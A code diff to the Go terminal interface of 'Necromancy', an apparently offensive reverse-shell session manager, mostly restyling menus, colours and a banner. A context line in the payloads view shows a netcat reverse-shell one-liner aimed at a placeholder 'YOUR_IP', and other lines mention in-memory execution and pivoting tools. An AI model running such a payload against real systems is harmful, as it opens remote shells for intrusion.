@@ -69,6 +69,58 @@ type App struct {
 	menuList *tview.List
 }
 
+func (a *App) mainMenuSummary() string {
+	activeSessions := len(a.sessions.GetAll())
+	return fmt.Sprintf(
+		"[yellow]Necromancy[white]\n"+
+			"[green]Active sessions:[white] %d\n\n"+
+			"[yellow]Quick keys[white]\n"+
+			"[green]s[white] Sessions\n"+
+			"[green]p[white] Payloads\n"+
+			"[green]m[white] Modules\n"+
+			"[green]i[white] Interfaces\n"+
+			"[green]q[white] Exit\n\n"+
+			"[yellow]Tips[white]\n"+
+			"- Use arrow keys to move\n"+
+			"- Press Enter to open\n"+
+			"- Press Esc to go back from tools",
+		activeSessions,
+	)
+}
+
+func mainMenuDetails(mainText, secondaryText string) string {
+	return fmt.Sprintf(
+		"[yellow]Selected[white]\n"+
+			"[green]%s[white]\n\n"+
+			"%s\n\n"+
+			"[yellow]Action[white]\n"+
+			"Press [green]Enter[white] to open this section.",
+		mainText,
+		secondaryText,
+	)
+}
+
+func newBannerView() *tview.TextView {
+	banner := tview.NewTextView().
+		SetDynamicColors(true).
+		SetTextAlign(tview.AlignCenter)
+
+	banner.SetBackgroundColor(tcell.ColorBlack)
+	banner.SetWrap(false)
+	banner.SetWordWrap(false)
+	banner.SetText(getBannerFromFile() + "\n[gray] v1.0.0 - Advanced Shell Manager [-]\n[gray] https://github.com/Aryma-f4/necromancy [-]\n")
+
+	return banner
+}
+
+func wrapWithBanner(content tview.Primitive, focusContent bool) tview.Primitive {
+	flex := tview.NewFlex().SetDirection(tview.FlexRow)
+	flex.SetBackgroundColor(tcell.ColorBlack)
+	flex.AddItem(newBannerView(), 0, 1, false)
+	flex.AddItem(content, 0, 2, focusContent)
+	return flex
+}
+
 func NewApp(sm *core.SessionManager) *App {
 	return &App{
 		tviewApp: tview.NewApplication(),
@@ -78,25 +130,26 @@ func NewApp(sm *core.SessionManager) *App {
 }
 
 func (a *App) Setup() {
-	// Make the overall app background transparent (match terminal)
-	tview.Styles.PrimitiveBackgroundColor = tcell.ColorDefault
+	// Set custom colors for better visibility
+	tview.Styles.PrimitiveBackgroundColor = tcell.ColorBlack
+	tview.Styles.ContrastBackgroundColor = tcell.ColorDarkBlue
+	tview.Styles.MoreContrastBackgroundColor = tcell.ColorBlue
+	tview.Styles.BorderColor = tcell.ColorBlue
+	tview.Styles.TitleColor = tcell.ColorYellow
+	tview.Styles.GraphicsColor = tcell.ColorWhite
+	tview.Styles.PrimaryTextColor = tcell.ColorWhite
+	tview.Styles.SecondaryTextColor = tcell.ColorGreen
+	tview.Styles.TertiaryTextColor = tcell.ColorDarkGray
+	tview.Styles.InverseTextColor = tcell.ColorBlack
+	tview.Styles.ContrastSecondaryTextColor = tcell.ColorDarkGreen
 
-	// Create main layout with ASCII art
-	flex := tview.NewFlex().SetDirection(tview.FlexRow)
-
-	// Create text view for ASCII art
-	logoView := tview.NewTextView().
+	// Create a cleaner and more interactive main menu layout.
+	root := tview.NewFlex().SetDirection(tview.FlexRow)
+	header := tview.NewTextView().
 		SetDynamicColors(true).
 		SetTextAlign(tview.AlignCenter)
-
-	// Set the logo view background to transparent
-	logoView.SetBackgroundColor(tcell.ColorDefault)
-
-	// Use ASCII banner from file
-	bannerText := getBannerFromFile()
-	logoView.SetWrap(false)
-	logoView.SetWordWrap(false)
-	logoView.SetText(bannerText)
+	header.SetBackgroundColor(tcell.ColorBlack)
+	header.SetText("[yellow]Necromancy Main Menu[white]  [gray]v1.0[-]\n[green]Interactive reverse shell manager[-]")
 
 	a.menuList = tview.NewList().
 		AddItem("View Sessions", "List all active reverse shells", 's', a.showSessionsList).
@@ -108,13 +161,46 @@ func (a *App) Setup() {
 		})
 
 	a.menuList.SetBorder(true).SetTitle(" Necromancy Main Menu v1.0 ")
-	a.menuList.SetBackgroundColor(tcell.ColorDefault)
+	a.menuList.SetBackgroundColor(tcell.ColorBlack)
 
-	// Add logo and menu to flex
-	flex.AddItem(logoView, 0, 1, false).
-		AddItem(a.menuList, 0, 1, true)
+	// Set highlight colors for better visibility
+	a.menuList.SetHighlightFullLine(true)
+	a.menuList.SetMainTextColor(tcell.ColorWhite)
+	a.menuList.SetSecondaryTextColor(tcell.ColorGreen)
+	a.menuList.SetSelectedBackgroundColor(tcell.ColorDarkBlue)
+	a.menuList.SetSelectedTextColor(tcell.ColorYellow)
+	a.menuList.ShowSecondaryText(true)
 
-	a.pages.AddPage("menu", flex, true, true)
+	infoView := tview.NewTextView().
+		SetDynamicColors(true).
+		SetWrap(true)
+	infoView.SetBorder(true).SetTitle(" Details ")
+	infoView.SetBackgroundColor(tcell.ColorBlack)
+	infoView.SetText(a.mainMenuSummary())
+
+	footer := tview.NewTextView().
+		SetDynamicColors(true).
+		SetTextAlign(tview.AlignCenter)
+	footer.SetBackgroundColor(tcell.ColorBlack)
+	footer.SetText("[gray]Navigate with arrows | Enter to select | q to quit[-]")
+
+	a.menuList.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
+		if mainText == "" {
+			infoView.SetText(a.mainMenuSummary())
+			return
+		}
+		infoView.SetText(mainMenuDetails(mainText, secondaryText))
+	})
+
+	body := tview.NewFlex().
+		AddItem(a.menuList, 0, 3, true).
+		AddItem(infoView, 0, 2, false)
+
+	root.AddItem(header, 2, 0, false)
+	root.AddItem(body, 0, 1, true)
+	root.AddItem(footer, 1, 0, false)
+
+	a.pages.AddPage("menu", root, true, true)
 }
 
 func (a *App) Run() error {
@@ -148,6 +234,7 @@ func (a *App) showSessionsList() {
 		return event
 	})
 
+	list.SetBackgroundColor(tcell.ColorBlack)
 	a.pages.AddPage("sessions", list, true, true)
 }
 
@@ -193,7 +280,8 @@ func (a *App) showSessionActions(id int) {
 		return event
 	})
 
-	a.pages.AddPage("session_actions", list, true, true)
+	list.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("session_actions", wrapWithBanner(list, true), true, true)
 }
 
 func (a *App) showUploadForm(id int) {
@@ -223,7 +311,8 @@ func (a *App) showUploadForm(id int) {
 		})
 
 	form.SetBorder(true).SetTitle(fmt.Sprintf(" Upload to Session %d ", id))
-	a.pages.AddPage("upload_form", form, true, true)
+	form.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("upload_form", wrapWithBanner(form, true), true, true)
 }
 
 func (a *App) showExecForm(id int) {
@@ -250,7 +339,8 @@ func (a *App) showExecForm(id int) {
 		})
 
 	form.SetBorder(true).SetTitle(fmt.Sprintf(" Execute In-Memory on Session %d ", id))
-	a.pages.AddPage("exec_form", form, true, true)
+	form.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("exec_form", wrapWithBanner(form, true), true, true)
 }
 
 func (a *App) showPortFwd(id int) {
@@ -282,7 +372,8 @@ method is to upload a statically compiled Chisel binary or run Ligolo.
 		}
 		return event
 	})
-	a.pages.AddPage("portfwd", tv, true, true)
+	tv.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("portfwd", wrapWithBanner(tv, true), true, true)
 }
 
 func (a *App) showModulesList(id int) {
@@ -314,7 +405,8 @@ func (a *App) showModulesList(id int) {
 		return event
 	})
 
-	a.pages.AddPage("modules_list", list, true, true)
+	list.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("modules_list", wrapWithBanner(list, true), true, true)
 }
 
 func (a *App) openSessionTerminal(id int) {
@@ -356,7 +448,8 @@ func (a *App) showInterfaces() {
 		}
 		return event
 	})
-	a.pages.AddPage("interfaces", tv, true, true)
+	tv.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("interfaces", wrapWithBanner(tv, true), true, true)
 }
 func (a *App) showPayloads() {
 	tv := tview.NewTextView().SetDynamicColors(true)
@@ -381,7 +474,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
 		}
 		return event
 	})
-	a.pages.AddPage("payloads", tv, true, true)
+	tv.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("payloads", wrapWithBanner(tv, true), true, true)
 }
 
 func (a *App) showAllModules() {
@@ -404,5 +498,6 @@ func (a *App) showAllModules() {
 		return event
 	})
 
-	a.pages.AddPage("all_modules", list, true, true)
+	list.SetBackgroundColor(tcell.ColorBlack)
+	a.pages.AddPage("all_modules", wrapWithBanner(list, true), true, true)
 }
